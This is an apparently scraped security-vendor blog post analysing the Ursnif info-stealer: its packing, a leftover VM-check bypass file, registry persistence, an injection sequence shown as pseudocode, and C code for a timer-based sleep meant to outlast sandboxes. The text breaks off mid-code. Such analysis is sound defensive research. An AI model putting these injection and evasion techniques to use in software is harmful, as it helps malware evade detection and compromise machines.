                                    </div> 
                                </div>
                            </li>
                        
                        </ul>
                    </div>
                    <div class="an-widget">
                        <h3>popular tags</h3>
                        <ul class="an-popular-tags">
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/in-the-media" title="">In the Media</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/news-media" title="">News &amp; Media</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/resources-cat" title="">Resources</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/press-releases" title="">Press Releases</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/webinars" title="">Webinars</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/blogs" title="">Blog</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/white-papers" title="">White Papers</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/reports" title="">Reports</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/2015" title="">2015</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/events" title="">Events</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/product" title="">Product</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/451-report" title="">451 Report</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/black-hat-security-analytics" title="">Black Hat, Security Analytics</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/brochures-and-datasheets" title="">Brochures &amp; Datasheets</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/gateway-attack-detection" title="">Gateway Attack Detection</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/in-the-news" title="">In the News</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/javelin" title="">Javelin</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/javelin-attack-simulator" title="">Javelin Attack Simulator</a></li>
                            
                        
                            
                            
                            <li><a href="http://www.seculert.com/blogs/topic/uncategorized" title="">Uncategorized</a></li>
                            
                        
                        </ul>
                    </div>
                </div>
             </div>
          </div>
     </div>
 </div>



<div class="blog-section" style="display:none">
    <div class="blog-post-wrapper cell-wrapper">
                <div class="blog-section">
            <div class="blog-post-wrapper cell-wrapper">
                <div class="section post-header">
                    <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Ursnif: Deep Technical Dive</span></h1>
                    <div id="hubspot-author_data" class="hubspot-editable" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
                        <span class="hs-author-label">Posted by</span>
                        
                            <a class="author-link" href="http://www.seculert.com/blogs/author/ariel-koren">Ariel Koren</a> on Aug 30, 2016 4:23:13 PM
                            
                            
                        
                    </div>
                </div>
                <span id="hs_cos_wrapper_blog_social_sharing" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_blog_social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="blog_social_sharing">
<div class="hs-blog-social-share">
    <ul class="hs-blog-social-share-list">
        
        <li class="hs-blog-social-share-item hs-blog-social-share-item-twitter">
            <!-- Twitter social share -->
            <a href="https://twitter.com/share" class="twitter-share-button" data-lang="en" data-url="http://www.seculert.com/blogs/ursnif-deep-technical-dive" data-size="medium" data-text="Ursnif: Deep Technical Dive">Tweet</a>
        </li>
        

        
        <li class="hs-blog-social-share-item hs-blog-social-share-item-linkedin">
            <!-- LinkedIn social share -->
            <script type="IN/Share" data-url="http://www.seculert.com/blogs/ursnif-deep-technical-dive" data-showzero="true" data-counter="right"></script>
        </li>
        

        
        <li class="hs-blog-social-share-item hs-blog-social-share-item-facebook">
            <!-- Facebook share -->
            <div class="fb-like" data-href="http://www.seculert.com/blogs/ursnif-deep-technical-dive" data-layout="button_count" data-action="like" data-show-faces="false" data-share="true" data-width="120"></div>
        </li>
        

        
        <li class="hs-blog-social-share-item hs-blog-social-share-item-google-plus">
            <!-- Google +1 -->
            <div class="g-plusone" data-size="medium" data-href="http://www.seculert.com/blogs/ursnif-deep-technical-dive"></div>
        </li>
        
    </ul>
 </div>

</span>
                <div class="section post-body">
                    <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span style="color: #333333;">While attack tools around the world are stealthy and stay under the radar, we at Seculert examine many different malicious tools. This is done to stay at least one step ahead of the attackers, and improve our advanced analytics technology to detect their artistic evasive techniques.</span></p>
<!--more-->
<table>
<tbody>
<tr>
<td>
<p><span style="color: #333333;">In this blog I explain some of the core methods an attack tool named Ursnif uses, as well as mention some, probably unintentional, pieces of code that were left behind in the production version of the malware.</span></p>
<p><span style="color: #333333;">Ursnif is a data stealer and a downloader with a lot of abilities to steal data from installed browsers and other applications (such as Microsoft Outlook).</span></p>
</td>
<td>
<p><img src="http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=1024&amp;name=URSNIF-Severe-msft.png" alt="URSNIF-Severe-msft.png" width="1024" style="width: 1024px; margin: 0px;" srcset="http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=512&amp;name=URSNIF-Severe-msft.png 512w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=1024&amp;name=URSNIF-Severe-msft.png 1024w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=1536&amp;name=URSNIF-Severe-msft.png 1536w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=2048&amp;name=URSNIF-Severe-msft.png 2048w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=2560&amp;name=URSNIF-Severe-msft.png 2560w, http://www.seculert.com/hs-fs/hubfs/images/URSNIF-Severe-msft.png?t=1475190447323&amp;width=3072&amp;name=URSNIF-Severe-msft.png 3072w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<span style="font-size: 9px;">Image:&nbsp;<a href="https://www.microsoft.com">https://www.microsoft.com</a>&nbsp;(Win32/Ursnif)&nbsp;</span></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">In addition to stealing data, Ursnif also has the ability to download additional malicious components from the attacker’s Command &amp; Control (C&amp;C) servers and load them dynamically into memory. In this version of Ursnif I have also encountered an internal peer-to-peer communication which could possibly add the ability for the sample to communicate with other Ursnif peers over the same network. We will discuss the peer-to-peer part in a future blog post.</span></p>
<p><span style="color: #333333;"><strong><u>It All Begins With An Executable</u></strong></span><br><span style="color: #333333;">When the Ursnif executable is first loaded, it will unpack the real payload. The real payload is packed by the attackers, because it helps keeping it undetected by security solutions which are based on a file signature.<br><br></span><span style="color: #333333;">After the real payload is unpacked, it will run in a hollowed process, and even at that stage of unpacking, the&nbsp;<a href="https://en.wikipedia.org/wiki/Data_segment" target="_blank" style="color: #333333; text-decoration: underline;">.</a><span style="text-decoration: underline;"><span><a href="https://en.wikipedia.org/wiki/Data_segment" target="_blank" style="color: #333333; text-decoration: underline;">BSS section</a></span></span> is still obfuscated and will be de-xored on runtime before the malware will continue with the execution.</span></p>
<p style="text-align: center;"><span style="font-size: 11px; color: #333333;"></span><a href="http://www.seculert.com/hubfs/Figure_1.jpg?t=1475190447323" rel="nofollow" data-mce-rel="nofollow"><img src="http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=640&amp;name=Figure_1.jpg" alt="The bss section before and after dexoring it" width="640" title="The bss section before and after dexoring it" caption="false" data-constrained="false" style="width: 640px; margin: 0px;" srcset="http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=320&amp;name=Figure_1.jpg 320w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=640&amp;name=Figure_1.jpg 640w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=960&amp;name=Figure_1.jpg 960w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=1280&amp;name=Figure_1.jpg 1280w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=1600&amp;name=Figure_1.jpg 1600w, http://www.seculert.com/hs-fs/hubfs/Figure_1.jpg?t=1475190447323&amp;width=1920&amp;name=Figure_1.jpg 1920w" sizes="(max-width: 640px) 100vw, 640px"></a>&nbsp;<br><span style="color: #808080;">The bss section before and after dexoring it</span></p>
<p><span style="color: #333333;">Afterward, there is a simple check the malware authors left behind. If the file C:\321.txt exists, the checks for a virtualized environment are ignored. This was most probably developed in order to allow the attackers to test their tool on their own virtualized machines. Even though it is quite funny that the attackers left this piece of code in a production compilation, it might show how careless they are. Basically, if anyone else would like to test Ursnif on a virtual machine, they can just create a file with that name at that location and the malware will work properly with no need to change the virtual machine's configurations.<br>Next, the malware will make sure that all of the users on the machine are infected, by enumerating the registry root key HKU and for each user key, it will put an appropriate startup value, as well as the payload on each AppData folder of each user. Registry Keys used:</span></p>
<p><span style="color: #333333;">• HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run\</span><br><span style="color: #333333;">• HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\<strong>AppData</strong></span><span style="color: #333333;">&nbsp; &nbsp;<br></span><span style="color: #333333;">&nbsp; &nbsp; ○ (Value equals the folder to be used for the malware, for example: &nbsp; <br>&nbsp; &nbsp; &nbsp; &nbsp; C:\Users\Administrator\Appdata\Roaming\")<br></span></p>
<p><span style="color: #333333;"> After this procedure, we move on to the injection method.</span></p>
<p><span style="color: #333333;"><strong><u>And It Continues With Another Executable To Be Injected</u></strong></span><br><span style="color: #333333;">In the second part, the malware will look for a legitimate process to run in its context. Running in a different process context allows the malware to bypass firewall rules which let some processes through without alerting or blocking them.</span></p>
<p><span style="color: #333333;">Internally, the malware calculates a unique checksum for each process name it finds, in order to obfuscate the processes into which it will try to inject itself. Instead of injecting to `explorer.exe` for example, a checksum will be calculated, resulting in something like 0x17F9B5AA. Then, it will check if that value matches a value from an internal list of checksums, and only if it exists in that list, it will begin the injection method on that process.&nbsp;<br><br>Let's examine a <strong>pseudo code</strong> (as simple as possible) of how the first part of the injection looks:</span></p>
<table style="border-color: #808080; width: 100%; margin-left: auto; margin-right: auto; background-color: #e6e6e6;" cellspacing="15" cellpadding="15">
<tbody>
<tr>
<td><span style="color: #008000;">/* Obtain the process pid to inject to */</span><br>dwPID = <span style="color: #0000ff;">GetInjectProcess</span>()<br><br>hProcess = <span style="color: #0000ff;">OpenProcess</span>(dwPID, ...)<br>pAddress = <span style="color: #0000ff;">GetProcAddress</span>(<span style="color: #ff9900;">"ntdll.dll"</span>, <span style="color: #ff9900;">"RtlExitUserThread"</span>)<br><br><span style="color: #008000;">/* Create remote thread in suspended mode */</span><br>hThread = <span style="color: #0000ff;">CreateRemoteThread</span>(hProcess,<span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* Remote process handle */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <span style="color: #800080;">CREATE_SUSPENDED</span>, &nbsp;<span style="color: #008000;">/* creation flags */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pAddress, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* thread function address */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...)<br><br><span style="color: #008000;">/* Read remote procedure first four bytes */</span><br>dwBackupData = <span style="color: #0000ff;">ZwReadVirtualMemory</span>(hProcess, &nbsp;<span style="color: #008000;">/* Remote process handle */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pAddress, &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #008000;">/* Address to read */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* number of bytes to read */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...)<br><br><span style="color: #008000;">/* Change address protection to `writable` */</span><br><span style="color: #0000ff;">VirtualProtectEx</span>( &nbsp; hProcess, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #008000;">/* Remote process handle */</span><br><span style="color: #800080;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ_WRITE_EXECUTE</span>, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* New protection flags */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pAddress, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* Address to change protection on */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #008000;">/* Size of address */</span><br>...)<br><br><br><span style="color: #0000ff;">ZwWriteVirtualMemory</span>(hProcess,&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #008000;">/* Remote process handle */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pAddress,<span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Address to overwrite */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xCCCCFEEB,<span style="color: #008000;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Data to write */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #008000;">/* Size of data */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...)</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<ul>
<li>Open a handle to the desired process.</li>
<li>Get the address of ntdll!RtlExitUserThread function.</li>
<li>Create a remote suspended thread with the appropriate function.</li>
<li>Obtain the first four bytes of the function as a backup (because in the upcoming steps, they will be overwritten).</li>
<li>Before we overwrite the bytes, we must change the protection flags of the memory so it will be writable.</li>
<li>Write four bytes (DWORD)(0xCCCCFEEB). This is the interesting part, changing the original function prologue this way, will result in an infinite loop.</li>
</ul>
<p>Let's examine the function before and after the changes:</p>
<table style="width: 100%; border-color: #000000; margin-left: auto; margin-right: auto; background-color: #e6e6e6;" border="1">
<tbody>
<tr>
<td style="width: 44.9592%; text-align: left;" rowspan="2">
<p style="text-align: center;">Before</p>
<p style="line-height: 1em;">ntdll!RtlExitUserThread:<br>77dc1000 <strong>8bff</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; edi,edi<br>77dc1002 <strong>55</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; ebp<br>77dc1003 <strong>8b</strong>ec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ebp,esp<br>77dc1005 83e4f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; esp,0FFFFFFF8h<br>77dc1008 81ecbc000000&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; esp,0BCh</p>
</td>
<td style="width: 50.0408%; text-align: left;" rowspan="2">
<p style="text-align: center;">After</p>
<p style="line-height: 1em;">ntdll!RtlExitUserThread:<br>77dc1000 <strong>ebfe</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; ntdll!RtlExitUserThread (77dc1000)<br>77dc1002 <strong>cc</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 3<br>77dc1003 <strong>cc</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 3<br>77dc1004 ec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; in&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,dx<br>77dc1005 83e4f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; esp,0FFFFFFF8h<br>77dc1008 81ecbc000000&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; esp,0BCh</p>
</td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">After the change, the new values assigned to the function prologue are translated to JMP &lt;Short&gt;, which is a two byte opcode. The first byte (0xEB) is what translated the processor to recognize it as a JMP opcode, and it will also expect the second byte to be the value of where to jump to (Relatively from the EIP at the end of the opcode). The second byte we have in this scenario is 0xFE, which translates to (-2). Jumping relatively from the end of the opcode (address 0x77dc1002) -2 bytes, will make the EIP get back to address 0x77dc1000, which is the same opcode again. This will result an infinite loop of one opcode. as you can see WinDBG translates it beautifully:&nbsp;</span></p>
<table style="border-color: #000000; width: 100%; margin-left: auto; margin-right: auto; background-color: #e6e6e6;">
<tbody>
<tr>
<td style="text-align: left;"><strong>77dc1000</strong><span> ebfe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; ntdll!RtlExitUserThread </span><strong>(77dc1000)</strong></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">After this change, the thread is resumed until its EIP of the newly created thread reach the ntdll!RtlExitUserThread address, then the thread is set to suspended mode again. The reason all this procedure is happening is because when a thread is created, it doesn’t immediately start at the function given, it requires some initialization functions to be called first, so the original code is waiting for the initialization to complete and then it have a post initialized thread which it can take control of its EIP without worrying.</span></p>
<p><span style="color: #333333;">Thereafter the thread is suspended again, the function original 4 bytes are restored. The new PE itself is injected with NtCreateSection and NtMapViewOfSection, for mapping the new PE to the malware's memory ending with SetThreadContext which with that we are able to change the registers value, specifically EIP - to the new created entry point of the remote process following ResumeThread.</span></p>
<p><span style="color: #333333;">As we've seen before, attackers are building techniques into their tools in order to evade detection by security solutions. One of the techniques exploits sandbox weaknesses by using different sleeping mechanisms. Sandboxing solutions usually run malware samples only for about 2-3 minutes before they move on to the next sample they have in queue. The reason is simply because those kind of solutions are required to keep up with analyzing hundreds of thousands of samples every day. Therefore, for a sandbox time is a very precious resource. Basically, this means that if a malware can stay dormant for this period of time, the sandbox will not recognize its behavior as malicious and will move to the next sample in queue.</span></p>
<p><span style="color: #333333;">Ursnif has recently evolved and changed the sleeping mechanism, trying to evade detection through a unique sleeping API. Earlier versions used Sleep\WaitForSingleObject\WaitForMultipleObjects or similar APIs. Nowadays, a different method coming in hand, Relative sleeping using windows timers. Here is a code example of how to use the Timers API:</span></p>
<table style="border-color: #808080; width: 100%; margin-left: auto; margin-right: auto; background-color: #e6e6e6;" cellspacing="15" cellpadding="15">
<tbody>
<tr style="height: 1692.96px;">
<td style="height: 1692.96px;">#<span style="color: #0000ff;">include</span> &lt;windows.h&gt;<br>#<span style="color: #0000ff;">include</span> &lt;tchar.h&gt;<br><span style="color: #008000;">/* Definitions */</span><br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">SLEEP_TIME</span> (5) <span style="color: #008000;">/* In seconds */</span><br><span style="color: #008000;">/* Macros */</span><br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">NANOSECONDS</span>(nanos) \<br>(((signed __int64)(nanos)) / 100L)<br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">MICROSECONDS</span>(micros) \<br>(((signed __int64)(micros)) * <span style="color: #800080;">NANOSECONDS</span>(1000L))<br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">MILLISECONDS</span>(milli) \<br>(((signed __int64)(milli)) * <span style="color: #800080;">MICROSECONDS</span>(1000L))<br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">SECONDS</span>(seconds) \<br>(((signed __int64)(seconds)) * <span style="color: #800080;">MILLISECONDS</span>(1000L)) <br><span style="color: #008000;">/* Enumerations */</span><br><span style="color: #0000ff;">typedef enum _E_CODE</span><br>{<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_FAILURE</span> = -1,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_SUCCESS</span> = 0,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_TIMER_CREATION</span>,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_SET_TIMER</span>,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_WAIT_EVENT</span>,<br>} <span style="color: #0000ff;">E_CODE</span>;<br><span style="color: #0000ff;">E_CODE SleepingMechanism</span>(DWORD dwSleepTime)<br>{<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Initializations */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; HANDLE hTimer = <span style="color: #800080;">NULL</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; E_CODE tRetVal = <span style="color: #800080;">E_FAILURE</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; FILETIME ftSystemTime = { 0 };<br>&nbsp; &nbsp; &nbsp; &nbsp; LARGE_INTEGER liSystemTime = { 0 };<br>&nbsp; &nbsp; &nbsp; &nbsp; DWORD dwWaitResult = 0;<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Create unnamed timer */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; hTimer = <span style="color: #0000ff;">CreateWaitableTimer</span>(<span style="color: #800080;">NULL</span>, <span style="color: #800080;">FALSE</span>, <span style="color: #800080;">NULL</span>);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">NULL</span> == hTimer)<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"CreateWaitableTimer failure: [%d]\n"</span>), <span style="color: #0000ff;">GetLastError</span>());<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_TIMER_CREATION</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto <span style="color: #0000ff;">lblCleanUp</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Get system time */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">GetSystemTimeAsFileTime</span>(&amp;ftSystemTime);<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Add relative time from current time to sleep */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; liSystemTime.HighPart = ftSystemTime.dwHighDateTime;<br>&nbsp; &nbsp; &nbsp; &nbsp; liSystemTime.LowPart = ftSystemTime.dwLowDateTime;<br>&nbsp; &nbsp; &nbsp; &nbsp; liSystemTime.QuadPart += <span style="color: #800080;">SECONDS</span>(dwSleepTime);<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Set timer with an absolute time to sleep */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; if (!<span style="color: #0000ff;">SetWaitableTimer</span>(hTimer, &amp;liSystemTime, 0, <span style="color: #800080;">NULL</span>, <span style="color: #800080;">NULL</span>, <span style="color: #800080;">FALSE</span>))<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Failed creating waitable timer: [%d]"</span>), <span style="color: #0000ff;">GetLastError</span>());<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_SET_TIMER</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto <span style="color: #0000ff;">lblCleanUp</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Waiting for the timer 